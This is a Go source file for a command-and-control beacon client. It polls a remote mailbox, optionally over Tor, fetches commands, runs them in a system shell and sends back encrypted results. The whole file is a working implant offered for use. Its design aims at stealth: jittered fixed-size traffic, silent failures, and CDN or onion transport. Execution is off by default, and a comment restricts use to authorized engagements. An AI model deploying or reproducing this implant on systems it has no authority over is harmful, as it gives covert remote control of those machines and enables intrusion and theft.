// Command beacon-client is the target-side half of a dead-drop beacon channel.
//
// It never listens on a port: every cycle it polls a mailbox for commands,
// optionally runs them, and writes encrypted results back. Traffic is
// fixed-size and jittered, and failures are silent by design.
//
// Use only inside an authorized engagement. The channel PSK is the only
// credential; losing it means re-authorizing the channel.
package main

import (
	"bytes"
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/Autumn-27/artex/beacon"
)

func main() {
	var (
		channel   = flag.String("channel", "", "信道 ID（必填）")
		pskHex    = flag.String("psk", "", "PSK（hex，必填）")
		mailbox   = flag.String("mailbox", "", "信箱地址：https://host/drop、host:port 或本地目录")
		proxy     = flag.String("proxy", "", "出口代理（socks5h://127.0.0.1:9050 等）")
		interval  = flag.Duration("interval", 60*time.Second, "基础心跳间隔")
		jitter    = flag.Float64("jitter", 0.4, "心跳抖动比例(0.4=±40%)")
		allowExec = flag.Bool("exec", false, "允许执行下发的命令（默认关闭，仅心跳）")
		timeout   = flag.Int("timeout", 30, "单条命令超时（秒）")
		once      = flag.Bool("once", false, "只执行一轮（调试用）")
		verbose   = flag.Bool("v", false, "输出诊断信息到 stderr")
	)
	flag.Parse()

	if *channel == "" || *pskHex == "" || *mailbox == "" {
		fmt.Fprintln(os.Stderr, "必填：-channel -psk -mailbox")
		os.Exit(2)
	}
	if err := beacon.ValidateChannelID(*channel); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}
	psk, err := hex.DecodeString(strings.TrimSpace(*pskHex))
	if err != nil || len(psk) != 32 {
		fmt.Fprintln(os.Stderr, "PSK 必须是 32 字节的 hex")
		os.Exit(2)
	}

	mb, err := buildMailbox(*mailbox, *proxy)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	runner := beacon.Runner(func(ctx context.Context, cmd string) beacon.Result {
		if !*allowExec {
			// Safe default: acknowledge the command without running it.
			return beacon.Result{Code: 126, Stderr: "execution disabled on this beacon"}
		}
		return runCommand(ctx, cmd, time.Duration(*timeout)*time.Second)
	})

	c, err := beacon.NewClient(beacon.ClientConfig{
		ChannelID: *channel,
		PSK:       psk,
		Mailbox:   mb,
		Runner:    runner,
		Interval:  *interval,
		Jitter:    *jitter,
	})
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	var lastIn uint64
	onErr := func(err error) {
		if *verbose {
			fmt.Fprintln(os.Stderr, "cycle:", err)
		}
	}
	if *once {
		if err := c.Cycle(ctx, &lastIn); err != nil && *verbose {
			fmt.Fprintln(os.Stderr, "cycle:", err)
		}
		return
	}
	// Silent by default: a chatty beacon is a fingerprint.
	c.Run(ctx, onErr)
}

// buildMailbox accepts a URL (http/https over CDN, or an onion reached through
// the SOCKS proxy) or a local directory path.
func buildMailbox(target, proxy string) (beacon.Mailbox, error) {
	target = strings.TrimSpace(target)
	if target == "" {
		return nil, fmt.Errorf("mailbox 为空")
	}
	if strings.HasPrefix(target, "file://") || strings.HasPrefix(target, "/") || strings.HasPrefix(target, "./") {
		return &beacon.FileMailbox{Root: strings.TrimPrefix(target, "file://")}, nil
	}
	if !strings.Contains(target, "://") {
		target = "http://" + target
	}
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}
	client := &http.Client{Timeout: 45 * time.Second}
	if proxy = strings.TrimSpace(proxy); proxy != "" {
		pu, perr := url.Parse(proxy)
		if perr != nil {
			return nil, perr
		}
		client.Transport = &http.Transport{Proxy: http.ProxyURL(pu)}
	}
	return &beacon.HTTPMailbox{Base: u.String(), Client: client}, nil
}

// runCommand executes one command with a timeout and returns trimmed output.
func runCommand(ctx context.Context, cmd string, timeout time.Duration) beacon.Result {
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	var shell, flagArg string
	if runtime.GOOS == "windows" {
		shell, flagArg = "cmd", "/C"
	} else {
		shell, flagArg = "/bin/sh", "-c"
	}
	c := exec.CommandContext(ctx, shell, flagArg, cmd)
	var out, errb bytes.Buffer
	c.Stdout, c.Stderr = &out, &errb
	err := c.Run()
	res := beacon.Result{Stdout: clip(out.String()), Stderr: clip(errb.String())}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			res.Code = ee.ExitCode()
		} else {
			res.Code = -1
			res.Error = err.Error()
		}
	}
	if ctx.Err() == context.DeadlineExceeded {
		res.Error = "timeout"
		res.Code = -1
	}
	return res
}

// clip keeps a result inside one frame: MaxPayload minus JSON overhead.
func clip(s string) string {
	const limit = beacon.MaxPayload / 2
	if len(s) > limit {
		return s[:limit] + "\n...(截断)"
	}
	return strings.TrimRight(s, "\n")
}
